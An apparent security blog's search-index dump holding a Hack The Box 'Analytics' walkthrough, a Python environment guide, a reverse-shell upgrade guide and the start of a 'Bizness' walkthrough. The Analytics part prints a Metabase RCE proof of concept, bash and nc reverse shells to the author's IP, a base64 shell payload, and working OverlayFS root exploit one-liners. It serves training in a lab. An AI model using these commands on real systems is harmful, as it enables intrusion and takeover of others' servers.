Ok, so data.analytical.htb exists (but, skipping ahead, even a quick check of the Login page would have shown the same thing) I&rsquo;ll add it to my /etc/hosts file:
echo &#34;$RADDR data.$DOMAIN&#34; | sudo tee -a /etc/hosts So far, I know about analytical.htb and data.analytical.htb. I&rsquo;ll do directory enumeration over those two next. First up, analytical.htb:
&#x1f914; To be honest, I still don&rsquo;t have a favourite directory enumeration tool:
Often, I favor ffuf for directory enumeration, for its extensive options. Other times, I like the simplicity of gobuster. And if I want to enumerate very deeply, I&rsquo;ll use feroxbuster.
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; OUTPUT=&#34;fuzzing/directory&#34; # This is what I often use: # ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o &#34;$OUTPUT.json&#34; -of json -e php,asp,js,html -timeout 4 -v gobuster dir -w $WLIST -u http://$DOMAIN \\ --random-agent -t 10 --timeout 5s -f -e \\ --status-codes-blacklist 400,401,402,403,404,405 \\ --output &#34;$OUTPUT-$DOMAIN.txt&#34; \\ --no-error Directory enumeration against http://analytical.htb/ gave the no results.
Next, I&rsquo;ll do directory enumeration on the subdomain, data.analytical.htb. Due to the amount of false-positives, I had to set some length filters on the results:
ffuf -w $WLIST:FUZZ -u http://data.$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o &#34;data.$DOMAIN-$OUTPUT.json&#34; -of json -e php,html -timeout 4 -v -fw 3574,1 Directory enumeration against http://data.analytical.htb/ didn&rsquo;t give any interesting results. Just a few unimportant pages showed up in the scan.
Exploring the website Navigating to the /login page shows that this website is running Metabase, an open source Analytics/BI platform:
Just to check the obvious, I did a web search for &ldquo;Metabase CVE&rdquo; to see if there was anything. As it turns out, there&rsquo;s plenty - including one fairly recent Critical (9.8): CVE-2023-38646. But is this server vulnerable? A quick check of http://data.analytical.htb/api/session/properties exposes all kinds of juicy info, including:
the version number: 0.46.6 the setup token (see below): 249fa03d-fd94-4d5b-b94f-b4ebf3df681f a bunch of database connection information Lucky for us, according to the NIST entry this version of Metabase might be vulnerable &#x1f44d; I&rsquo;m sure there&rsquo;s some excellent PoC code waiting to be used.
FOOTHOLD Testing for vulnerability After trying a few different PoC exploits, I eventually found this one, by @robotmikhro. The way to test for the vulnerability is by running the provided PoC, and attempting to get the target Metabase server to make a request to a webserver under your control (many people use Burp Collaborator for this). Many PoC tools require you to obtain the setup token from http://data.analytical.htb/api/session/properties first, but this tool detects it for you.
So, to try this out, first I need to start up a webserver:
# open the firewall and start up an http server sudo ufw allow from $RADDR to any port 4444,8000 proto tcp mkdir www; cd www python3 -m http.server 8000 # run the PoC code python3 single.py -u http://data.analytical.htb -c &#39;curl http://10.10.14.9:8000/itworked&#39; Bingo! That means it&rsquo;s vulnerable.
The exploit works by making a POST request to /api/setup/validate, using a specially crafted payload. Within that payload is a bogus definition of which database to query. The definition we provide will actually contain a command that we inject (above, just a simple curl request).
Gaining RCE I&rsquo;ll try using this exploit to form a reverse shell. No need to play with encoding: this exploit handles that already. First, I&rsquo;ll try a bash reverse shell:
# switch to bash, instead of zsh bash socat -d TCP-LISTEN:4444 STDOUT python3 single.py -u http://data.analytical.htb -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.9/4444 0&gt;&amp;1&#39; Hmm, no result&hellip; &#x1f914; I&rsquo;ll try having the target reach out to my listener over nc instead, just to see if it can make contact using nc at all.
python3 single.py -u http://data.analytical.htb -c &#39;nc 10.10.14.9 4444&#39; Ok, so it contacted my listener. I&rsquo;ll try some other reverse shells:
# nc with bash python3 single.py -u http://data.analytical.htb -c &#39;nc 10.10.14.9 4444 -e bash&#39; # Connection received but closed right away # Bash 196 python3 single.py -u http://data.analytical.htb -c &#39;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.10.14.9/4444; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196&#39; # Success! Excellent! the Bash 196 reverse shell worked. I&rsquo;m not yet sure why that one worked and the others didn&rsquo;t. It&rsquo;ll probably become apparent later.
&#x1f381; One of my favourite tools lately is the Reverse Shell Generator at https://www.revshells.com/ by @0dayCTF.
Simply pop in your IP address and listener port, then specify what type of shell you want (and what type of encoding to use), and it handles all of the rest for you. I find it very handy for experimenting with many different reverse shell types without too much effort! 10/10 &#x1f44d;
USER FLAG Enumeration: metabase First things first, let&rsquo;s do some simple enumeration of the system. What notable users exist?
id &amp;&amp; cat /etc/passwd | grep -v nologin | grep -v /bin/false root:x:0:0:root:/root:/bin/ash sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt metabase:x:2000:2000:Linux User,,,:/home/metabase:/bin/ash Interesting: metabase appears to be the only user with a home directory. That&rsquo;s either a good thing (that we can go straight to the user flag) or a bad thing (we&rsquo;re probably in a docker container). It&rsquo;s probably the latter.
A quick check of the home directory confirms it: there is no flag present. Thankfully though, we have write access to the home directory - so why not take this opportunity to plant an SSH key?
# On the attacker machine, generate a new key ssh-keygen -t rsa -b 4096 # I used passphrase &#34;5parrow&#34; chmod 700 ./id_rsa base64 -w 0 id_rsa.pub &gt; id_rsa.pub64 cat id_rsa.pub64 # copy output to clipboard # On the target machine, write the public key into authorized_keys echo “c3NoLX...hvc3Q=” | base64 --decode &gt; /home/metabase/.ssh/authorized_keys &#x261d;&#xfe0f; I find it useful to write the base64-encoded public key to a file. Often enough, you&rsquo;ll need to reset the box, re-exploit, and re-plant the SSH key. All that becomes incrementally easier if you take good notes on your exploit and public key.
Hmm&hellip; Attempting to log in via SSH was unsuccessful. Apparently the target machine does not allow for login with a key only. That&rsquo;s fine. I&rsquo;ll just upgrade my shell instead.
Please see my guide on upgrading the shell for more details. I wrote it only a couple days ago &#x1f604;
Unfortunately, none of that is really working. I can&rsquo;t even switch into bash - still stuck in sh! &#x1f62c;
Oh well, I&rsquo;ll continue on with enumeration using this dumb shell. Checking env (one of the first things I do when I start linux enumeration) reveals some very interesting details:
That looks like a credential for Metabase itself: metalytics : An4lytics_ds20223# I&rsquo;ll try it on the website first, and hope for a re-used credential elsewhere.
Nope, it looks like I can&rsquo;t use just a username as a login&hellip; I&rsquo;ll need an email address.
I tried &ldquo;metalytics@metabase.htb&rdquo; with no success. Realizing I probably should have used a known/confirmed domain, I tried metalytics@analytical.htb:
Success! I&rsquo;ll take a look at the dashboard in a little bit &#x1f6a9;. For now, I want to check for credential re-use with SSH:
&#x1f389; Wonderful! Now I have a much nicer shell to use, and a way to log back in without re-exploiting. Not only that, but metalytics has a home directory, and they have the user flag! Read the flag for some points:
cat /home/metalytics/user.txt That was probably the fastest and easiest escape from a docker container I&rsquo;ve ever experienced &#x1f433;
Optional: Planting a new SSH key I already generated an ssh key for this box; I&rsquo;ll go ahead and plant it into metalytics so that I can make an ssh config file on my attacker box. The result is simply that I won&rsquo;t need to use the password to connect in the future (and that it&rsquo;s good practice).
Note that this would be foolish to do on an actual engagement: it unnecessarily leaves behind obvious evidence of your intrusion.
# On the attacker machine: cat id_rsa.pub64 # copy to clipboard RUSER=metalytics echo &#34;Host $RUSER\\n\\tHostName $RADDR\\n\\tUser $RUSER\\n\\tIdentityFile ./id_rsa\\n\\tIdentitiesOnly yes&#34; &gt; ssh_config_$RUSER # On the target machine, paste the base64 pubkey: mkdir -p ~/.ssh; echo &#34;c3NoL...bGkK&#34; | base64 -d &gt;&gt; ~/.ssh/authorized_keys # Log in from attacker machine: ssh -F ssh_config_$RUSER $RUSER ROOT FLAG Enumeration: metalytics Set up convenient alias and a tmp directory for my toolbox:
alias ll=&#34;ls -lah&#34; &amp;&amp; mkdir -p /tmp/.Tools &amp;&amp; chmod 770 /tmp/.Tools What other users are on this box?
id &amp;&amp; cat /etc/passwd | grep -v nologin | grep -v /bin/false Looks like just metalytics and root. Can I sudo anything?
# Can I \`sudo\` anything? sudo -l # nope # Any interesting environment variables? env # nothing unexpected # Find where www-data has write permissions find / -user $USER 2&gt;/dev/null | grep -v &#39;^\\(/sys\\|/proc\\|/run\\)&#39; find / -group $USER 2&gt;/dev/null | grep -v &#39;^\\(/sys\\|/proc\\|/run\\)&#39; Only the home directory is writable by metalytics. Output is omitted for clarity, but the gist is that www-data has write permissions to /var/www/devvortex.htb, /var/www/dev.devvortex.htb, and /etc/nginx. What about notable software?
which nc netcat socat curl wget python python3 perl php tmux The box has nc, netcat, curl, wget, python3, perl, tmux.
What listening services are running?
netstat -tulpn | grep LISTEN We already knew about SSH and HTTP from the initial nmap scans, but now we also know DNS and MySQL are listening. Is cron running anything notable?
crontab -l ; cat /etc/crontab ; ls -laR /etc/cron No, nothing interesting there. Let&rsquo;s take a quick look for SUID/SGID executables, and for files with extra capabilities:
find / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; 2&gt;/dev/null | grep -v &#39;/proc&#39;; getcap -r / 2&gt;/dev/null Also nothing out of the ordinary in there.
Let&rsquo;s check for simple, system-wide vulnerabilities like kernel or sudo:
First I&rsquo;ll look into sudo:
sudo --version # Sudo version 1.9.9 # Sudoers policy plugin version 1.9.9 # Sudoers file grammar version 48 # Sudoers I/O plugin version 1.9.9 # Sudoers audit plugin version 1.9.9 Hmm, my attacker box is running sudo version 1.9.15p5. Again, not ancient, but a little old. I&rsquo;ll run it through searchsploit:
&#x1f924; That looks very promising! I remember hearing about some sudo vulnerability a few months back. Examining the exploit with searchsploit -x 51217 shows that it pertains to CVE-2023-22809, a vulnerability in how sudo parses positional arguments following a -- break. It&rsquo;s just a shell script, so why not give it a try?
# on the attacker box cp /usr/share/exploitdb/exploits/linux/local/51217.sh ~/Box_Notes/Analytics/Tools/ cd ~/Box_Notes/Analytics/Tools/ python3 -m http.server 8000 # on the target box cd /tmp/.Tools wget http://10.10.14.9:8000/51217.sh chmod +x 51217.sh ./51217.sh # run it No luck! I tried a few different PoC scripts that I found on github for this CVE as well - all had no effect.
Next, I&rsquo;ll check the kernel and look for an exploit:
uname -a # or alternatively, use cat /proc/version # Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux Ok, 6.2.0 is definitely not the newest, but it&rsquo;s not ancient either. I cross-referenced this against the list of kernel exploits in this github repo and found nothing. However, when I did a web search for this specific version of the kernel, I found several mentions of a CVE. Actually a pair of CVEs used in conjunction: CVE-2023-2640 &amp; CVE-2023-32629, cutely dubbed Game Overlay.
Surprise, surprise: a little more searching turned up a PoC exploit:
unshare -rm sh -c &#34;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*; u/python3 -c &#39;import os;os.setuid(0);os.system(\\&#34;id\\&#34;)&#39;&#34; Wait, what?! Did it actually work? Sometimes these filesystem exploits seem like witchcraft. I&rsquo;ll try modifying the PoC into a reverse shell. I&rsquo;ll start out with a base64-encoded bash shell:
# On the attacker box, open the firewall and start a listener sudo ufw allow from $RADDR to any port 4445 proto tcp socat -d TCP-LISTEN:4445 STDOUT # On the target box, try the modified payload: unshare -rm sh -c &#34;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*; u/python3 -c &#39;import os;os.setuid(0);os.system(\\&#34;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzQ0NDUgMD4mMQ== | base64 -d | bash -i \\&#34;)&#39;&#34; &#x1f610; Partial success? I definitely just got a reverse shell as root, but in doing so&hellip; the whole filesystem lost its directory permissions?
I&rsquo;ll be honest, definitely never seen that before &#x1f440;
Thankfully, if I exit out of the &ldquo;root&rdquo; reverse shell, it terminates the connection and brings my old SSH connection back into metalytics. I wonder why that&rsquo;s happening. I&rsquo;ll try to find some other PoC scripts for these CVEs and see if I get the same result.
I found another PoC that is a little more sophisticated, by @g1vi. It works on the same principle, but instead it copies bash into a directory and sets the SUID bit on it. Then, once you exit from the root user, the whole thing cleans itself up - nice!
unshare -rm sh -c &#34;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&#34; &amp;&amp; u/python3 -c &#39;import os;os.setuid(0);os.system(&#34;cp /bin/bash /var/tmp/bash &amp;&amp; chmod 4755 /var/tmp/bash &amp;&amp; /var/tmp/bash -p &amp;&amp; rm -rf l m u w /var/tmp/bash&#34;)&#39; &#x1f352; Alright! That did it!
It&rsquo;s unclear to me why the first one had that strange effect: changing all the filesystem&rsquo;s permissions. The major difference between the two is that the former is two separate commands, while the latter runs the whole payload through a sh -c call.
Now that I can access /root, just cat the flag for the root points! &#x1f44f;
LESSONS LEARNED Attacker Check for CVEs early and often. As soon as you fingerprint the target (or identify the version of an application that might be a PE vector), do a very quick search online and see if any CVEs apply. Often enough, this will point you in the right direction and prevent you from re-inventing the wheel. If you&rsquo;re lucky, there will even be some PoC code, saving even more time. Don&rsquo;t be afraid to try new shells: For this box, I had to use a reverse shell that I had only used once before. Thankfully, with tools like https://www.revshells.com/, it becomes very fast and easy to switch the type of reverse shell you&rsquo;re using. Use a checklist. It&rsquo;s really easy to overlook tiny details and have them fade into the overwhelming mess of information that you sift through while enumerating. When you&rsquo;re hacking, the devil is in the details. Stick to a checklist and be methodical. For each item in the checklist, try to apply a little research to the box&rsquo;s little details. Often enough, this pedantic habit save you hours of time. Defender Stay on top of breaking news with CVEs. Or better yet, keep your code on Github and use one of their awesome vulnerability-scanning tools. As an administrator, it&rsquo;s best to automate whatever you can. Not only will it save you time, it can act as an early-warning system to act against emerging vulnerabilities and exploits.
Avoid credential re-use. There is no good reason to justify why lewis re-used their credential for the database. It&rsquo;s just sloppy and lazy, making the attacker&rsquo;s job substantially easier.
Keep secrets out of env . When possible, be sure to unset shell variables. Try to use a proper .env file instead. Better yet, just abstract-away the problem by having your CMS handle the secrets for you.
Minimize privileges that might be risky. Why was the metalytics user able to use OverlayFS at all? The privesc to root could have been prevented by keeing OverlayFS out of the hands of unprivileged users.
`,url:"https://4wayhandshake.github.io/walkthrough/analytics/"},"https://4wayhandshake.github.io/strategy/python-environment/":{title:"Python Environments",tags:["Python","Setup","Tools"],categories:["Strategy","Linux"],content:`INTRODUCTION Background: Why write this? The short answer is: I often forget how to do this, and I wanted a quick, no-B.S. reference for recreating a functional Python environment for hacking.
I know I&rsquo;m not alone in believing that Python is the best tool for the job when you need something done quick and dirty. It&rsquo;s great for writing proof-of-concept scripts, but also excels at console-based applications. If you&rsquo;ve read enough of my walkthroughs, you&rsquo;ll know that Python is my go-to language for automating all kinds of attacks, ranging from web to cryptography.
The problem with Python: Python&rsquo;s long-standing popularity in the infosec community is both it&rsquo;s greatest strength and greatest weakness: You will often be required to use tools written in Python up to 20 years old. Very often, older tools will be written in Python 2.7, completely incompatible with a modern Python environment. As a hacker, you need to be comfortable in an environment simultaneously running Python 2.7 and Python 3.X.
To exacerbate this issue, the Python ecosystem handles code dependencies in way that often feels inadequate (although, to it&rsquo;s credit, it&rsquo;s a really easy-to-use). Over the years, Python has brandished a variety of solutions for package management: Often you&rsquo;ll see code that uses an egg or a wheel and just shrug it off.
All of these factors come together to create the perfect storm of cluttering-up your system with incompatible libraries and tools. It might not happen right away, but eventually this will come back to bite you.
Mixing 2.7 and 3.X Getting Python 2.7 to work properly This guide assumes you are running a recent version of Kali linux.
Start by installing the latest version of Python 3 and Pip, if you haven&rsquo;t already done so. In many cases, this will break your Python 2 environment. The following steps will allow you to set up a hybrid environment where both work without interfering with one another.
Follow the steps outlined in this guide, written for Kali: https://www.kali.org/docs/general-use/using-eol-python-versions/
pyenv should now be installed and set global to Python 2.7.18.
Next, reinstall pip aka pip2 using the particular EOL repo:
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py python get-pip.py At this point, your system may be complaining about the location of pip/pip2/pip2.7 not being on the path. Add it to your zshrc or bashrc:
echo &#39;export PATH=&#34;/home/kali/.local/bin&#34;:$PATH&#34;&#39; &gt;&gt; ~/.zshrc pip2 requires setuptools for all subsequent package installations. Go get it:
pip2 install --upgrade setuptools Now, to test things out, try installing a package:
pip2 install termcolor # Success! You should now have a fully-functional Python 2 + Pip environment. At any time, you can check what versions you have available by running pyenv versions. Then, you can globally enable a certain version, ex. pyenv global 2.7.18.
&#x1f6a8; Remember to use pyenv global system to toggle back to the system python version (probably Python 3.9 or later)
Using a venv What you require If you&rsquo;re like me, you frequently clone a repo from Github containing a Python program, and lack the dependencies to run it. Ideally, those dependencies will be written into a requirements file, but sometimes not. When there is no requirements file, often the easiest (not the fastest!) way to resolve the dependencies is like this:
Run the program, seeing what dependency it complains about. If it actually runs, skip the rest of the steps. pip3 install whatever dependency it&rsquo;s complaining about. Repeat step 1. That&rsquo;s all fine, but it will definitely clutter up your system with incompatible nonsense. To mitigate this, use a venv.
Yes, you can use pyenv to do this too, but the following method works even without pyenv, so it&rsquo;s more general.
Applying a venv As an example, I&rsquo;ll use one of my repos, congenial-winner. It consists of a single python script, with dependencies but no requirements file:
git clone https://github.com/4wayhandshake/congenial-winner.git cd congenial-winner # Establish a venv inside this directory python3 -m venv . # There are now directories: bin, include, lib, lib64 # Activate the venv, source bin/activate Note that sourcing bin/activate has placed the directory-local version of python (and pip) at the start of your $PATH.
# Install dependencies pip3 install subprocess itertools argparse # Try running it ./known-plaintext.py Success! All dependencies are installed to the environment within this directory. When you&rsquo;re done playing around with the code from that repo, you can simply delete the whole directory from your system with no consequences.
&#x1f6a8; To deactivate your venv and return to your regular user- or system-installed python environment, simply run deactivate, which will be on your $PATH as long as you activated the venv:
deactivate Pyenv Setup There is a wonderful tool called pyenv that can do both of the above tasks quite well. It allows you to install multiple versions of python without them interfering. Not only that, but you can install arbitrary versions of Python and use them in virtual environments.
Installation of pyenv is outside the scope of this article. Just google it if you need help.
First, install the version you want to use. For example:
pyenv install 3.6.1 To use the version, just set it to either the shell-, local-, or system-level python version and pyenv exec something:
Virtual environments To create a named virtual environment, just give it any name that makes sense to you:
pyenv virtualenv 3.6.1 my-python3.6-env This effectively adds a new, virtual installation of python using the specific version. It&rsquo;s not particular to this directory, it&rsquo;s effectively a separate system installation of that particular python version. To make it act like venv, change to the directory you want to use it in, and set it as the local python version:
cd project/using-old-python pyenv local my-python3.6-env Just like using a venv, you need to activate and deactivate the virtual environment:
# activate the environment pyenv activate my-python3.6-env # do some stuff using that version: pyenv exec python3 ./janky_python3.6_script.py # deactivate it when you&#39;re done pyenv deactivate CONCLUSION You can isolate your individual projects/repos by using venv, and separate your various python versions from each other by using pyenv. Using a combination of the two, you can keep your system clean and (hopefully) free of conflicting package versions. With a little effort into setup, you can combine these two ideas using pyenv. Taking these steps will mitigate all the unfortunate nuances of Python dependency management. With any luck, you&rsquo;ll be able to proceed for with your hacking for years to come, in blissful ignorance of conflicting packages and Python versions.
For more detail, please see the official Python guide for using venv with pip.
`,url:"https://4wayhandshake.github.io/strategy/python-environment/"},"https://4wayhandshake.github.io/strategy/upgrading-the-shell/":{title:"Upgrading the Shell",tags:["Shell","Tips & Tricks","Foothold"],categories:["Strategy","Linux"],content:`INTRODUCTION Background: Why a reverse shell? A successful attack on a target almost always involves creating a reverse shell. For anyone unfamiliar, a reverse shell is when you - the attacker - open up a listener on your machine, then force the target to connect back to your machine. This opens a shell on the target machine that is accessible by the attacker machine.
Why is that important? From the target machine&rsquo;s perspective, the connection is formed using outbound traffic. If the connection happens over an innocuous-looking port, then it&rsquo;s very likely that a firewall on the target will not prevent this connection from forming. After all, the point of internet access is well&hellip; to access the internet! It would be unreasonable for any kind of security system to block your outbound connection.
The problem Any hacker with even a modest degree of experience knows the pain of working out of a &ldquo;dumb&rdquo; shell. There&rsquo;s always the instinctive Ctrl+C keypress to worry about. Additionally, more often than not, all the modern niceties are missing:
tab completion command recall (hitting up arrow) colors scripting Initially, reverse shells are such fragile things. How can you regain some of the above functionality without accidentally closing your connection? I&rsquo;ll go over the basics in this article.
Note: not all of the steps in this article are always necessary. It would be foolish to do every one every time you make a reverse shell. Only take these steps as you need them.
BASH IT AROUND Before catching the shell Prior to forming the reverse shell, it is useful to switch to bash on your attacker machine. I find this gives the most flexibility when upgrading the shell on linux targets.
Upgrading the shell won&rsquo;t always enable command recall. It&rsquo;s good to prepare your reverse shell with rlwrap. This is a tool that I deem essential against Windows targets, but isn&rsquo;t always necessary against a Linux target. That being said, I don&rsquo;t really see any downside in using it.
&#x261d;&#xfe0f; If I&rsquo;m being honest, I still don&rsquo;t know why sometimes command recall/history works and sometimes it doesn&rsquo;t!
Lastly, I&rsquo;ve found that using a socat reverse shell provides best control over all of these options. Again though, that&rsquo;s just anecdotal.
Putting all of the above together, this is my stereotypical prep for catching a reverse shell:
# Open a port on the firewall sudo ufw allow from $RADDR to any port 4444 proto tcp # Switch to bash (I&#39;m usually in zsh) bash # Use socat listener with rlwrap rlwrap socat -d TCP-LISTEN:4444 STDOUT Choose your weapon The first step is to find out what tools you have available on the target. Check for python and perl, and check the location of bash.
This article assumes that the target does indeed have bash. Other shells will work too, with slight modification to the steps taken.
which python python3 perl bash We&rsquo;ll use python, perl, or even bash itself to open a proper bash shell. For python, use the pty module:
python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; For perl, just exec it directly:
perl -e &#39;exec &#34;/bin/bash&#34;&#39; You may be asking yourself &ldquo;why not just open the reverse shell using those in the first place&rdquo;? Sometimes you can. Often, that type of this is prevented by application sandboxing. Even moderately-sensible settings for nginx and apache prevent this type of thing.
Finally, if neither python nor perl are present, just set the terminal to bash directly:
SHELL=/bin/bash script -q /dev/null Make it pretty Open another terminal on your attacker machine. Set it up exactly like you did before opening your reverse shell listener. Personally, I usually roll in Kali, using zsh: I prepare for a reverse shell by opening a new tab in QTerminal then switching to bash:
[Ctrl+Shift+T] bash Then, check what your current settings look like. Most importantly, we want to know the dimensions (rows and columns) and the current terminal. Jot down the output from these:
# Check the color profile echo $TERM # Check how many rows and columns are present stty -a Better yet, perform the above steps before you even start up your listener.
Keep in mind that the rows and columns will vary, depending on the state of your terminal window (if you&rsquo;re using your operating system in windowed mode).
Now that you&rsquo;ve recorded your settings, switch back to your reverse shell and do the upgrade:
# Background the current process [Ctrl+Z] # Put the terminal into raw / no-echo mode # and foreground the original process stty raw -echo; fg [Enter] [Enter] Finally, put your original settings into this terminal:
export TERM=xterm-256color # From what you recorded earlier export SHELL=bash stty rows 35 columns 120 # From what you recorded earlier If everything went according to plan, you should have a pleasant reverse shell with things like colors and tab-completion, and command recall using the up arrow:
The result of everything should be a fully interactive TTY terminal. You can even use full-screen programs like less and pspy from a reverse shell that has been upgraded like this.
tldr; Do this on your attacker machine:
sudo ufw allow from $RADDR to any port 4444 proto tcp bash echo $TERM stty -a | grep rows rlwrap socat -d TCP-LISTEN:4444 STDOUT Catch the reverse shell, then do this via the reverse shell:
which python python3 perl bash python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;) [Ctrl+Z] stty raw -echo; fg [Enter] [Enter] export TERM=xterm-256color export SHELL=bash stty rows 35 columns 120 Still not working? If all of the above failed, as a last resort just use interactive sh. Do this in you reverse shell:
export TERM=xterm /bin/sh -i Troubleshooting: &ldquo;None of your instructions worked. You&rsquo;re an idiot, 4wayhandshake.&rdquo;
You probably forgot to switch to bash before opening your reverse shell listener. Terminate your reverse shell, switch to bash, then open your listener and re-exploit.
&ldquo;On every line break, my shell is offset to the column of the last character of the previous line. Lists get printed out diagonally.&rdquo;
It&rsquo;s likely you forgot to switch to a bash shell before using stty raw -echo mode. You&rsquo;ll have to terminate your reverse shell, re-exploit, and try again. Make sure to do the steps listed in here first.
&ldquo;Backspace doesn&rsquo;t work! Neither do arrows! Only letters seem to work. Anything else appears as a control character like &lsquo;^B&rsquo;! &ldquo; &#x1f640;
You might not need to terminate your reverse shell. In short, your stty settings are messed up. Try resetting it back to default:
# This might fix your arrow keys and tab stty sane export TERM=linux Then try writing something and hitting backspace. Does it appear as &ldquo;^H&rdquo;? If so, do this extra step:
stty erase ^H You can always check which control characters are being used by reading the second line of stty -a.
CONCLUSION The above steps will become a rote habit as you form more and more reverse shells. When you find yourself lacking functionality that you need, see if any of these techniques will help you upgrade your way out of it. Without too much effort, you&rsquo;ll soon be able to produce a reverse shell with a similar look and feel to an SSH connection.
I hope you find these techniques as useful as I have. Shout out to @ropnop for writing their blog post that taught me to do the majority of this in the first place.
`,url:"https://4wayhandshake.github.io/strategy/upgrading-the-shell/"},"https://4wayhandshake.github.io/walkthrough/bizness/":{title:"Bizness",tags:["OFBiz","CVE","SSRF","Reversing","Derby","Password Cracking"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION Bizness, at first glance, is a cheeky satire of the modern business landing page. It&rsquo;s a website for a fictional company called BizNess that seemingly&hellip; well, I can&rsquo;t really tell what they do. They use a lot of fun buzz words though! &#x1f60e; The entry into the server is all about attacking some well-known ERP software.
Foothold on this box is a breeze. A little bit of enumeration and fingerprinting will lead to near-instantaneous success. Privilege escalation to root, however, is much more difficult. It will require you to enumerate very carefully, finding ways to tackle a system bloated with distracting configuration files, plugins, and log files everywhere. Not only that, but when you finally do find what you need, you&rsquo;ll have to apply solid reasoning to take what you&rsquo;ve found and transform it into escalation.
This box felt very unbalanced: The user flag is deceptively simple, while the root flag takes quite a bit of work - more than you might expect on an Easy box. Don&rsquo;t give up!
RECON nmap scans For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR Host is up (0.085s latency). Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https 36459/tcp open unknown No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94SVN%E=4%D=1/29%OT=22%CT=1%CU=31094%PV=Y%DS=2%DC=I%G=Y%TM=65B7 OS:C1C8%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=110%TI=Z%CI=Z%TS=A)SEQ(S OS:P=102%GCD=1%ISR=110%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW OS:7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE88% OS:W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CN OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R= OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4 OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID= OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0) | ssh-hostkey: | 3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA) | 256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA) |_ 256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519) 80/tcp open http nginx 1.18.0 |_http-server-header: nginx/1.18.0 |_http-title: Did not follow redirect to https://bizness.htb/ 443/tcp open ssl/http nginx 1.18.0 | tls-nextprotoneg: |_ http/1.1 |_ssl-date: TLS randomness does not represent time |_http-title: Did not follow redirect to https://bizness.htb/ | tls-alpn: |_ http/1.1 | ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK | Not valid before: 2023-12-14T20:03:40 |_Not valid after: 2328-11-10T20:03:40 |_http-server-header: nginx/1.18.0 36459/tcp open tcpwrapped Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel &#x1f440; Where can I get a 305-year SSL cert?!
The big surprise from this scan is whatever is listening on TCP port 36459 - what&rsquo;s that about?
To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
